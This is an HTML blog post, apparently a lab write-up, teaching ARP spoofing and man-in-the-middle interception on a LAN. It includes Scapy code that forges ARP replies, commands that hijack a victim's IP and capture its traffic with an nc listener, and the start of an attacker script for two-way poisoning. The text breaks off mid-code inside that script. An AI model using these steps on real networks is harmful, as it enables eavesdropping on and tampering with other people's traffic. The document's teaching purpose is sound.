<!doctype html><html data-enable-theme-switch="true" data-use-system-theme="false" data-default-theme="dark" data-current="post" lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Intercepting traffic and Man in the middle via ARP spoofing</title><meta name="description" content="Talks about how ARP poisoning can be used to intercept the traffic"><link rel="dns-prefetch" href="https://identity.netlify.com"><script async src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="/portfolio/assets/css/main.css"><script>// Initialize theme
    // Must run before page rendering to prevent flash
    const themeConfig = document.documentElement.dataset;
    const theme = localStorage.getItem('theme');

    if (theme) {
      themeConfig.theme = theme;
    } else {
      const defaultTheme = themeConfig.defaultTheme;
      const useSystemTheme = themeConfig.useSystemTheme === 'true';
      const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;

      themeConfig.theme = (useSystemTheme && prefersDark) ? 'dark' : defaultTheme;
    }</script><script defer="defer" src="/portfolio/assets/js/main.bundle.js"></script></head><body><div class="wrapper-bg-wrapper"><div class="wrapper-bg"></div></div><header class="site-header"><div class="site-header__container"><span class="site-header__logo-container"><a class="site-header__logo" href="/portfolio/" aria-label="Logo"> <?xml version="1.0" encoding="utf-8"?> <svg width="40px" height="40px" viewBox="0 0 128 128" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="iconify iconify--noto" preserveAspectRatio="xMidYMid meet"><path d="M71.59 68.58H58.75c0 20.36-4.21 28.52-4.21 28.52H75.8c0-.01-4.21-8.17-4.21-28.52z" fill="#b7d5e5"></path><path d="M39.41 98.17c-.07-1.14.1-2.64.1-2.64s45.24-1.88 48.83-.09c0 0 .48 1.66.15 2.74c-.79 2.53-10.99 4.8-24.55 4.8s-24.37-2.16-24.53-4.81z" fill="#2f7889"></path><ellipse cx="64" cy="95.96" rx="24.55" ry="4.8" fill="#b7d5e5"></ellipse><path d="M71.59 68.58H58.75c0 6.64-.45 11.98-1.05 16.16l15.31 2.3c-.78-4.47-1.42-10.54-1.42-18.46z" fill="#69a1ba"></path><path d="M55.49 91.46s-3.72 1.52-2.88 2.63c1.3 1.74 4.93 2.83 13.71 3.42c6.17.41 3.75 2.13-2.05 2.48c-4.07.24-23.58.4-24.74-3.67c-.94-3.31 13.18-4.86 15.96-4.86z" fill="#eee"></path><path d="M99.4 106.51H28.49c-.97 0-1.94.54-2.48 1.4l-7.78 10.7c-.72.98-.01 2.36 1.2 2.36h89.13c1.22 0 1.92-1.38 1.2-2.36l-7.88-10.8c-.53-.76-1.5-1.3-2.48-1.3z" fill="#eee"></path><g opacity=".57" fill="#69a1ba"><path d="M35.61 111.26h-4.86l.65-1.18h4.86z"></path><path d="M43.28 111.26h-4.86l.54-1.18h5.07z"></path><path d="M50.62 111.26h-4.97l.76-1.18h4.85z"></path><path d="M57.85 111.26h-4.86l.76-1.18h4.64z"></path><path d="M65.08 111.26h-4.97l.44-1.18h4.1z"></path><path d="M72.31 111.26h-4.86l-.54-1.18h4.65z"></path><path d="M79.87 111.26H74.9l-.86-1.18h4.86z"></path><path d="M87.1 111.26h-4.97l-.86-1.18h4.97z"></path><path d="M96.92 111.26h-7.45l-.86-1.18h7.56z"></path><path d="M93.14 113.21H98l-.86-1.3h-4.97z"></path><path d="M85.16 113.21h4.85l-.97-1.3h-4.86z"></path><path d="M77.82 113.21h4.85l-.75-1.3h-4.97z"></path><path d="M69.94 113.21h4.85l-.86-1.3h-4.64z"></path><path d="M62.92 113.21h4.86l-.54-1.3h-4.1z"></path><path d="M55.9 113.21h4.86l.33-1.3h-4.75z"></path><path d="M48.24 113.21h4.86l.65-1.3H49z"></path><path d="M39.61 113.21h4.96l.76-1.3h-4.97z"></path><path d="M29.68 113.21h7.34l.75-1.3h-7.45z"></path><path d="M76.09 115.15h4.96l-.86-1.3h-4.96z"></path><path d="M68.32 115.15h4.85l-.64-1.3h-4.64z"></path><path d="M59.03 115.15H64l-.11-1.3h-4.42z"></path><path d="M50.29 115.15h4.97l.43-1.3h-4.75z"></path><path d="M41.12 115.15h4.85l.76-1.3h-4.86z"></path><path d="M28.7 115.15h9.83l.75-1.3h-9.82z"></path><path d="M84.4 115.15h14.68l-.86-1.3H83.54z"></path><path d="M95.52 117.09h4.96l-.97-1.29h-4.96z"></path><path d="M86.45 117.09h4.86l-.97-1.29h-4.86z"></path><path d="M47.27 117.09h33.35l-.75-1.29H48.02z"></path><path d="M36.8 117.09h4.96l.54-1.29h-4.75z"></path><path d="M27.52 117.09h4.85l.54-1.29h-4.75z"></path></g><path d="M108.69 124H19.31c-.88 0-1.64-.76-1.64-1.62v-2.4h92.68v2.4c-.01.86-.78 1.62-1.66 1.62z" fill="#2f7889"></path><path d="M99.4 107.52c.61 0 1.3.36 1.67.88l8.22 11.27c.05.06.05.13.02.2c-.04.07-.09.1-.17.1H18.86c-.08 0-.13-.03-.17-.1a.166.166 0 0 1 .02-.2l8.12-11.16l.02-.03l.02-.03c.35-.57.99-.93 1.63-.93h70.9m0-1.01H28.49c-.97 0-1.94.54-2.48 1.4l-8.12 11.16c-.57.79-.01 1.9.97 1.9h90.29c.98 0 1.54-1.11.97-1.9l-8.22-11.27c-.55-.75-1.52-1.29-2.5-1.29z" fill="#b7d5e5"></path><path d="M113.46 79.66H14.54a3.44 3.44 0 0 1-3.44-3.44v-67c0-1.9 1.54-3.44 3.44-3.44h98.91c1.9 0 3.44 1.54 3.44 3.44v67c.01 1.9-1.53 3.44-3.43 3.44z" fill="#69a1ba"></path><path d="M113.46 77.89H14.54a3.44 3.44 0 0 1-3.44-3.44v-67c0-1.9 1.54-3.44 3.44-3.44h98.91c1.9 0 3.44 1.54 3.44 3.44v67a3.431 3.431 0 0 1-3.43 3.44z" fill="#b7d5e5"></path><radialGradient id="IconifyId17ecdb2904d178eab7646" cx="46.465" cy="-5.176" r="60.973" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#2f7889"></stop><stop offset="1" stop-color="#424242"></stop></radialGradient><path fill="url(#IconifyId17ecdb2904d178eab7646)" d="M15.25 9.38h97.5V72.5h-97.5z"></path><path fill="none" stroke="#eee" stroke-width="3.014" stroke-linecap="round" stroke-miterlimit="10" d="M16.39 6.99h11.19"></path></svg> </a></span><button class="site-header__mobile-nav" data-drawer-trigger="" aria-controls="drawer-name" aria-expanded="false"><span class="site-header__mobile-nav-label">Menu</span> <svg width="226" height="187" viewBox="0 0 226 187" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0 0H225.311V22.8494H0V0Z" fill="currentColor"/><path d="M0 81.872H225.311V104.721H0V81.872Z" fill="currentColor"/><path d="M0 163.744H225.311V186.593H0V163.744Z" fill="currentColor"/></svg></button><nav class="site-header__nav"><ul class="site-header__items"><li class="site-header__item"><a class="site-header__link" href="/portfolio/about/">About</a></li><li class="site-header__item"><a class="site-header__link" href="/portfolio/blog/">Blog</a></li><li class="site-header__item"><a class="site-header__link" href="/portfolio/projects/">Projects</a></li><li class="site-header__item"><a class="site-header__link" href="/portfolio/contact/">Contact</a></li><li class="site-header__item"><button class="site-header__link site-header__link--theme-switch" data-theme-switch><svg width="19" height="19" viewBox="0 0 19 19" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 14C7.01472 14 5 11.9853 5 9.5C5 7.01472 7.01472 5 9.5 5C11.9853 5 14 7.01472 14 9.5C14 11.9853 11.9853 14 9.5 14ZM9.5 13C11.433 13 13 11.433 13 9.5C13 7.567 11.433 6 9.5 6C7.567 6 6 7.567 6 9.5C6 11.433 7.567 13 9.5 13ZM10 3H9V0H10V3ZM14.4497 5.25736L13.7426 4.55025L15.864 2.42893L16.5711 3.13604L14.4497 5.25736ZM16 10V9H19V10H16ZM13.7426 14.4497L14.4497 13.7426L16.5711 15.864L15.864 16.5711L13.7426 14.4497ZM9 16H10V19H9V16ZM4.55025 13.7426L5.25736 14.4497L3.13604 16.5711L2.42893 15.864L4.55025 13.7426ZM3 9V10H0V9H3ZM5.25736 4.55025L4.55025 5.25736L2.42893 3.13604L3.13604 2.42893L5.25736 4.55025Z" fill="currentColor"/></svg></button></li></ul></nav></div></header><section class="drawer" id="drawer-name" data-drawer-target><div class="drawer__overlay" data-drawer-close tabindex="-1"></div><div class="drawer__wrapper"><div class="drawer__header"><button class="drawer__close" data-drawer-close aria-label="Close Drawer"><svg width="45" height="45" viewBox="0 0 45 45" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M0 3.84294L3.84294 0L22.4996 18.7131L41.2127 0L45 3.84294L26.3425 22.4996L45 41.2127L41.2127 45L22.4996 26.3425L3.84294 45L0 41.2127L18.7131 22.4996L0 3.84294Z" fill="currentColor"/></svg></button></div><div class="drawer__content"><ul class="drawer__nav"><li class="drawer__nav-item"><a href="/">Home</a></li><li class="drawer__nav-item"><a href="/portfolio/about/">About</a></li><li class="drawer__nav-item"><a href="/portfolio/blog/">Blog</a></li><li class="drawer__nav-item"><a href="/portfolio/projects/">Projects</a></li><li class="drawer__nav-item"><a href="/portfolio/contact/">Contact</a></li></ul></div></div></section><main><div class="page-container"><article><h1>Intercepting traffic and Man in the middle via ARP spoofing</h1><p><time datetime="2026-02-06">6 February 2026</time></p><hr><p>So, I will talk about how to intercept the traffic while being on the same LAN. But before that we need to know a bit about communication among different devices on the LAN.</p><p>Devices on the same LAN communicates on Layer 2 using:</p><ul><li>Ethernet frames</li><li>MAC addresses</li><li><strong>Switches</strong> (Layer 2 devices)</li></ul><p>Let's say we have three hosts:</p><ul><li>Host A -&gt; IP 10.0.0.1</li><li>Host B -&gt; IP 10.0.0.2</li><li>Host C -&gt; IP 10.0.0.3</li></ul><p>Now if host A wants to send packets to host B or C, it needs to know their mac addresses. But how? It happens via <strong>ARP</strong> protocol. Wait wait, I will show you code as well, that will clear all things. But first let's know a bit about <strong>ARP</strong>.</p><ul><li>Used to get the <strong>IP address -&gt; MAC ( hardware address )</strong> mapping.</li><li><strong>Broadcast</strong> request</li><li><strong>Unicast</strong> replies</li><li>It is not safe as it is <strong>not authenticated and no way to check if arp response is legit or coming from the right server</strong>.</li><li>Devices accept replies without verification and update their ARP table (ip -&gt; mac mapping). So next time they need to send any packet, they will check the ARP table, form the packet and send to mapped mac address.</li></ul><p>So how does <strong>ARP</strong> request looks like?</p><pre class="language-python"><code class="language-python"><span class="token triple-quoted-string string">"""<br>Host A asks who has the IP 10.0.0.2<br>"""</span><br><br><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> Ether<span class="token punctuation">,</span> ARP<span class="token punctuation">,</span> sendp<span class="token punctuation">,</span> srp<br><br>iface <span class="token operator">=</span> <span class="token string">"eth0"</span><br>target_ip <span class="token operator">=</span> <span class="token string">"10.0.0.2"</span><br><br>pkt <span class="token operator">=</span> Ether<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"ff:ff:ff:ff:ff:ff"</span><span class="token punctuation">)</span> <span class="token operator">/</span> ARP<span class="token punctuation">(</span>  <span class="token comment"># Ethernet broadcast</span><br>    op<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> pdst<span class="token operator">=</span>target_ip<br><span class="token punctuation">)</span>  <span class="token comment"># ARP who-has</span><br><br>sendp<span class="token punctuation">(</span>pkt<span class="token punctuation">,</span> iface<span class="token operator">=</span>iface<span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><br><br><span class="token comment"># Ethernet broadcast goes out.</span><br><span class="token comment"># The host that owns 10.0.0.2 replies with its MAC.</span><br><br><span class="token comment"># Send ARP and wait for the reply (most useful)</span><br><br>pkt <span class="token operator">=</span> Ether<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"ff:ff:ff:ff:ff:ff"</span><span class="token punctuation">)</span> <span class="token operator">/</span> ARP<span class="token punctuation">(</span>pdst<span class="token operator">=</span>target_ip<span class="token punctuation">)</span><br>ans<span class="token punctuation">,</span> _ <span class="token operator">=</span> srp<span class="token punctuation">(</span>pkt<span class="token punctuation">,</span> iface<span class="token operator">=</span>iface<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><br><br><span class="token keyword">for</span> _<span class="token punctuation">,</span> reply <span class="token keyword">in</span> ans<span class="token punctuation">:</span><br>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"IP:"</span><span class="token punctuation">,</span> reply<span class="token punctuation">.</span>psrc<span class="token punctuation">,</span> <span class="token string">"MAC:"</span><span class="token punctuation">,</span> reply<span class="token punctuation">.</span>hwsrc<span class="token punctuation">)</span><br><br><span class="token comment"># ARP requests (broadcast)</span><br></code></pre><p>So now how will host B replies i.e <strong>ARP reply</strong>?</p><pre class="language-python"><code class="language-python"><span class="token triple-quoted-string string">"""<br>Manually send an Address Resolution Protocol packet. The packet informs the remote host that the IP address 10.0.0.2 can be found at the Ethernet address 42:42:42:42:42:42. The packet should be sent to the remote host at 10.0.0.1.<br>"""</span><br><br><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> Ether<span class="token punctuation">,</span> ARP<span class="token punctuation">,</span> sendp<span class="token punctuation">,</span> srp<span class="token punctuation">,</span> get_if_hwaddr<br><br>iface <span class="token operator">=</span> <span class="token string">"eth0"</span><br><br><span class="token comment"># if need to check same machine mac address</span><br>mac_same_machine <span class="token operator">=</span> get_if_hwaddr<span class="token punctuation">(</span><span class="token string">"eth0"</span><span class="token punctuation">)</span><br><span class="token keyword">print</span><span class="token punctuation">(</span>mac_same_machine<span class="token punctuation">)</span><br><br>announced_ip <span class="token operator">=</span> <span class="token string">"10.0.0.2"</span><br>announced_mac <span class="token operator">=</span> <span class="token string">"42:42:42:42:42:42"</span><br><br><span class="token comment"># Sending ARP reply</span><br>target_ip <span class="token operator">=</span> <span class="token string">"10.0.0.1"</span><br><br>pkt <span class="token operator">=</span> Ether<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"ff:ff:ff:ff:ff:ff"</span><span class="token punctuation">)</span> <span class="token operator">/</span> ARP<span class="token punctuation">(</span><br>    op<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>  <span class="token comment"># ARP reply ("is-at")</span><br>    psrc<span class="token operator">=</span>announced_ip<span class="token punctuation">,</span>  <span class="token comment"># IP being announced</span><br>    hwsrc<span class="token operator">=</span>announced_mac<span class="token punctuation">,</span>  <span class="token comment"># MAC being announced</span><br>    pdst<span class="token operator">=</span>target_ip<span class="token punctuation">,</span>  <span class="token comment"># target IP</span><br>    hwdst<span class="token operator">=</span><span class="token string">"ff:ff:ff:ff:ff:ff"</span><span class="token punctuation">,</span><br><span class="token punctuation">)</span><br><br><span class="token comment"># ARP is a Layer-2 (Ethernet) protocol.</span><br>sendp<span class="token punctuation">(</span>pkt<span class="token punctuation">,</span> iface<span class="token operator">=</span>iface<span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><br></code></pre><p><strong>REMEMBER:</strong> Broadcast packet is received by all hosts but only the host with matching IP will reply, other hosts will silently drop the arp request.</p><p>Now we can manually ( I mean by code ) send the ARP reply packet to any host and spoof their ARP table. VOILA!!</p><h4 id="challenge-1%3A" tabindex="-1"><a class="header-anchor" href="#challenge-1%3A">#</a> Challenge 1:</h4><ul><li>Intercept traffic from a remote host. The remote host at 10.0.0.2 (host B) is communicating with the remote host at 10.0.0.3 (host C) on port 31337? You are at host A 10.0.0.1</li></ul><pre class="language-python"><code class="language-python"><span class="token comment"># 10.0.0.2</span><br><span class="token keyword">class</span> <span class="token class-name">ClientHost</span><span class="token punctuation">:</span><br>    <span class="token keyword">def</span> <span class="token function">entrypoint</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><br>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><br>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><br>            <span class="token keyword">try</span><span class="token punctuation">:</span><br>                client_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span><br>                client_socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"10.0.0.3"</span><span class="token punctuation">,</span> <span class="token number">31337</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br>                client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"some_secret"</span><span class="token punctuation">)</span><br>                client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><br>            <span class="token keyword">except</span> <span class="token punctuation">(</span>OSError<span class="token punctuation">,</span> ConnectionError<span class="token punctuation">,</span> TimeoutError<span class="token punctuation">)</span><span class="token punctuation">:</span><br>                <span class="token keyword">continue</span><br><br><span class="token comment"># 10.0.0.3</span><br><span class="token keyword">class</span> <span class="token class-name">ServerHost</span><span class="token punctuation">:</span><br>    <span class="token keyword">def</span> <span class="token function">entrypoint</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><br>        server_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span><br>        server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">31337</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br>        server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span><br>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><br>            <span class="token keyword">try</span><span class="token punctuation">:</span><br>                connection<span class="token punctuation">,</span> _ <span class="token operator">=</span> server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span><br>                connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><br>                connection<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><br>            <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span><br>                <span class="token keyword">continue</span></code></pre><ul><li>We are at host A (10.0.0.1)</li><li>Host B is a client, sending some sensitive info to host C.</li><li>Host C is running a server, which accepts the packets from Host B and close the connection.</li><li>So we can craft an <strong>arp reply</strong> for machine B, telling that machine Câ€™s ip belongs to host A mac address. It will work as it is not authenticated. It will spoof host B arp table.</li><li>Now when machine B tries to send a packet to machine C, it will check its <strong>arp table</strong> and will find the host A mac address mapped to C's IP.</li><li>Host A will receive the packet but they will be dropped by the kernel, why? Think a bit:<ul><li>Because Host A and Host C ip addresses are different and the kernel will drop them.</li><li>We can add host C Ip to the <strong>eth0</strong> interface of host A using the below command:</li></ul></li></ul><pre class="language-bash"><code class="language-bash"><span class="token comment"># Run this on host A</span><br><span class="token function">ip</span> addr <span class="token function">add</span> <span class="token number">10.0</span>.0.3 dev eth0</code></pre><ul><li>Now when the packet comes from host B to host A containing host C ip, they will not be dropped. But if no service is running on the desired port, we will receive nothing.</li><li>So in order to receive complete host B packets, we will run the service on the desired port on host A and we can check the packet data then sent from Host B.</li></ul><pre class="language-bash"><code class="language-bash"><span class="token comment"># Run the web server on host A on port 31337 </span><br><span class="token comment"># as host B is connecting to host C on port 31337</span><br><br><span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">0.0</span>.0.0 <span class="token number">31337</span></code></pre><p>Congratulations!! If you have made upto this point, you will now have a better understanding.</p><h4 id="challenge-2%3A-man-in-the-middle" tabindex="-1"><a class="header-anchor" href="#challenge-2%3A-man-in-the-middle">#</a> Challenge 2: Man in the Middle</h4><ul><li>Now, not only Host B sends the packet to Host C, but there is back and forth communication between host B and host C. We need to eve drop on the packets, modify them and forward them.</li><li>The code shows the communication between Host B and Host C.</li><li>This code is for demonstration purpose only.</li></ul><pre class="language-python"><code class="language-python"><span class="token comment"># Host B 10.0.0.2</span><br><span class="token keyword">class</span> <span class="token class-name">AuthenticatedClientHost</span><span class="token punctuation">:</span><br>    <span class="token keyword">def</span> <span class="token function">entrypoint</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><br>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><br>            <span class="token keyword">try</span><span class="token punctuation">:</span><br>                client_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span><br>                client_socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"10.0.0.3"</span><span class="token punctuation">,</span> <span class="token number">31337</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br><br>                <span class="token keyword">assert</span> client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b"secret: "</span><br>                secret <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>server_host<span class="token punctuation">.</span>secret<span class="token punctuation">)</span>  <span class="token comment"># Get the secret out-of-band</span><br>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><br>                client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>secret<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br><br>                <span class="token keyword">assert</span> client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b"command: "</span><br>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><br>                client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b"echo"</span><span class="token punctuation">)</span><br>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><br>                client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b"Hello, World!"</span><span class="token punctuation">)</span><br>                <span class="token keyword">assert</span> client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b"Hello, World!"</span><br><br>                client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><br>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><br><br>            <span class="token keyword">except</span> <span class="token punctuation">(</span>OSError<span class="token punctuation">,</span> ConnectionError<span class="token punctuation">,</span> TimeoutError<span class="token punctuation">,</span> AssertionError<span class="token punctuation">)</span><span class="token punctuation">:</span><br>                <span class="token keyword">continue</span><br><br><span class="token comment"># Host C 10.0.0.3</span><br><span class="token keyword">class</span> <span class="token class-name">AuthenticatedServerHost</span><span class="token punctuation">:</span><br>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span><br>        <span class="token builtin">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><br>        self<span class="token punctuation">.</span>secret <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Array<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><br><br>    <span class="token keyword">def</span> <span class="token function">entrypoint</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><br>        server_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span><br>        server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">31337</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br>        server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span><br>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><br>            <span class="token keyword">try</span><span class="token punctuation">:</span><br>                connection<span class="token punctuation">,</span> _ <span class="token operator">=</span> server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span><br><br>                self<span class="token punctuation">.</span>secret<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><br>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><br>                connection<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b"secret: "</span><span class="token punctuation">)</span><br>                secret <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br>                <span class="token keyword">if</span> secret <span class="token operator">!=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>secret<span class="token punctuation">)</span><span class="token punctuation">:</span><br>                    connection<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><br>                    <span class="token keyword">continue</span><br><br>                time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><br>                connection<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b"command: "</span><span class="token punctuation">)</span><br>                command <span class="token operator">=</span> connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><br><br>                <span class="token keyword">if</span> command <span class="token operator">==</span> <span class="token string">"echo"</span><span class="token punctuation">:</span><br>                    data <span class="token operator">=</span> connection<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><br>                    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><br>                    connection<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>data<span class="token punctuation">)</span><br>                <span class="token keyword">elif</span> command <span class="token operator">==</span> <span class="token string">"secret"</span><span class="token punctuation">:</span><br>                    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><br>                    connection<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"some_secret"</span><span class="token punctuation">)</span><br><br>                connection<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><br>            <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span><br>                <span class="token keyword">continue</span></code></pre><ul><li>The previous method won't work because now we have bi-directional communication B -&gt; C and C -&gt; B. Earlier B was sending packets to C and that's it.</li><li>Now we need to eves drop what both are communicating.</li><li>So earlier we poison the ARP table of host B only and trick B to think that A is C. But C is also sending packets to B, we have to trick C as well in thinking that A is B. Then we will receive packets from both B and C.</li></ul><pre class="language-bash"><code class="language-bash"><span class="token comment"># Now communication will look like</span><br><br>B -<span class="token operator">></span> A -<span class="token operator">></span> C<br>C -<span class="token operator">></span> A -<span class="token operator">></span> B</code></pre><ul><li>So we will poison both B and C arp table and tricking them in sending the packets to A's mac address. Then A will intercept, modify and forward the packets.</li><li>This is all possible because we are operating at Layer 2 and kernel packet forwarding is disabled.</li></ul><pre class="language-bash"><code class="language-bash"><span class="token comment"># If it is zero, it means kernel is disabled to forward the packets.</span><br><span class="token comment"># 1 means, kernel is enabled to forward the packets.</span><br><br><span class="token function">cat</span> /proc/sys/net/ipv4/ip_forward</code></pre><ul><li>Now here is the python code to poison the ARP table and intercept, modify and forward mechanism.</li></ul><pre class="language-python"><code class="language-python"><span class="token triple-quoted-string string">"""<br>Man-in-the-middle traffic from a remote host. The remote host at 10.0.0.2 is communicating with the remote host at 10.0.0.3 on port 31337. <br>We are at Host A, 10.0.0.1<br>"""</span><br><br><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span><br><span class="token keyword">import</span> threading<br><br><br><span class="token keyword">class</span> <span class="token class-name">AttackerHost</span><span class="token punctuation">:</span><br>    <span class="token keyword">def</span> <span class="token function">entrypoint</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><br>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><br><br>        self<span class="token 